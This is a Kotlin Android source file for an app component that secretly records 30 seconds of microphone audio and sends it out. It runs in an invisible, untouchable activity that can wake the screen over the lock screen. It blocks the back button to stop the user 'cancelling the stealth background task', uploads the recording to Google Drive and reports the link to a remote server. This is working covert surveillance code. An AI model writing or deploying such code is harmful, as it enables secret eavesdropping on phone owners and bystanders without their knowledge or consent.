package com.neubofy.veto.ui

import android.Manifest
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Bundle
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import androidx.core.content.ContextCompat
import com.neubofy.veto.utils.GoogleDriveUploader
import com.neubofy.veto.utils.log
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import java.io.File

class DummyAudioActivity : AppCompatActivity() {

    private val appScope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var hasStarted = false

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val ctx = applicationContext
        if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            ctx.log().w(TAG, "Audio permission missing.")
            finish()
            return
        }

        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.O) {
            @Suppress("Deprecation")
            window.addFlags(WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED or WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON)
        }

        window.setFlags(
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
            WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE
        )

        onBackPressedDispatcher.addCallback(this, object : androidx.activity.OnBackPressedCallback(true) {
            override fun handleOnBackPressed() {
                // Do nothing to prevent user from cancelling the stealth background task
            }
        })

        startRecording()
    }

    override fun onResume() {
        super.onResume()
        // Intentionally empty — recording is started in onCreate only
    }

    override fun onNewIntent(intent: android.content.Intent) {
        super.onNewIntent(intent)
        setIntent(intent)
        // Ignore re-delivery: a recording is already running
    }

    private fun startRecording() {
        if (hasStarted) return
        hasStarted = true

        val ctx = applicationContext
        val outputFile = File(cacheDir, "audio_${System.currentTimeMillis()}.m4a")

        // Use applicationContext-scoped coroutine so recording survives even if Activity is destroyed
        appScope.launch {
            val recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                MediaRecorder(ctx)
            } else {
                @Suppress("DEPRECATION")
                MediaRecorder()
            }
            try {
                recorder.setAudioSource(MediaRecorder.AudioSource.MIC)
                recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                recorder.setAudioEncodingBitRate(128000)
                recorder.setAudioSamplingRate(44100)
                recorder.setOutputFile(outputFile.absolutePath)
                recorder.prepare()
                recorder.start()

                ctx.log().i(TAG, "Started recording audio in transparent activity...")
                delay(30000L) // 30 seconds

                recorder.stop()
                recorder.release()

                // Finish the activity immediately — upload happens fully in background
                runOnUiThread { finish() }

                GoogleDriveUploader.uploadFile(
                    context = ctx,
                    file = outputFile,
                    mimeType = "audio/mp4",
                    type = "audio",
                    onSuccess = { link ->
                        outputFile.delete()
                        val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
                        transport.send(ctx, "Audio Captured: $link", "audio")
                    },
                    onError = { error ->
                        outputFile.delete()
                        val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
                        transport.send(ctx, "Failed to upload audio: $error", "audio")
                    }
                )
            } catch (e: Exception) {
                ctx.log().e(TAG, "Audio recording failed: ${e.message}")
                val transport = com.neubofy.veto.transports.NextJsServerTransport(ctx)
                transport.send(ctx, "Audio recording failed: ${e.message}", "audio")
                try { recorder.release() } catch (_: Exception) {}
                outputFile.delete()
                runOnUiThread { finish() }
            }
        }
    }

    companion object {
        val TAG = DummyAudioActivity::class.simpleName
    }
}
